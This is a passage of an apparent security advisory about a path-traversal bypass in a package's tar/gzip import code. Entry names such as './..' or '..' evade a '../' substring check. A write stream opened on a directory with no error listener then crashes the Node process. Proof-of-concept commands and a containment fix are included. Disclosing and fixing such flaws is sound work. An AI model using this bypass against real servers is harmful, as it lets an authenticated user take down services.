node -e "console.log('./..'.includes('../')); console.log('..'.includes('../')); console.log('a/./..'.includes('../'));"
```

```text
false
false
false
```

`path.join` then resolves it out of the export directory:

```bash
node -e "const path=require('path'); const exportPath='/tmp/exportRoot'; console.log(path.join(exportPath,'./..'));"
```

```text
/tmp
```

And a write stream opened on a directory, with no `error` listener, kills the process rather than failing the request:

```bash
node -e "const fs=require('fs'); const s=fs.createWriteStream('/tmp'); s.write('x'); s.end(); setTimeout(()=>console.log('still alive'),500);"
```

```text
events.js:291
      throw er; // Unhandled 'error' event
      ^

Error: EISDIR: illegal operation on a directory, open '/tmp'
Emitted 'error' event on WriteStream instance at:
    at internal/fs/streams.js:361:12
    at FSReqCallback.oncomplete (fs.js:156:23) {
  errno: -21,
  code: 'EISDIR',
  syscall: 'open',
  path: '/tmp'
}
```

The `events.js:291` frame shows that transcript came off the Node 14 line my audit box had. The unhandled-`error`-event behavior is not version specific, but the exact message on your supported Node versions is worth a re-run.

Source-side confirmation without running anything:

```bash
grep -n "includes('../')" packages/import-export/lib/formats/gzip.js
grep -n "WriteStream" packages/import-export/lib/formats/gzip.js
```

### Impact

An authenticated user who can reach the import UI uploads one crafted archive and takes down the Node process handling it. Every worker that picks up such an archive dies the same way.

### Suggested fix

Resolve the target and require containment, and attach an error handler:

```js
const base = path.resolve(exportPath);
const target = path.resolve(path.join(exportPath, name));

if (target !== base && !target.startsWith(base + path.sep)) {
  stream.on('end', next);
  stream.resume();
  return;
}

if (header.type === 'directory') {
  fsp.mkdir(target).then(next).catch(reject);
} else {
  const out = fs.WriteStream(target);
  out.on('error', reject);
  stream.pipe(out);
  stream.on('end', next);
}
```

The error handler earns its place independently. Any tar entry that lands on an existing directory name has the same effect whether or not traversal is involved.

### Why this is not GHSA-mwxc-m426-3f78

The `name.includes('../')` check is the mitigation shipped for GHSA-mwxc-m426-3f78 / CVE-2026-32731. It stops names carrying the literal `../` sequence. It does not canonicalize the joined path, so `./..` and a bare `..` still get through, and it did not touch the missing `error` listener. This report is about what the substring test leaves behind.
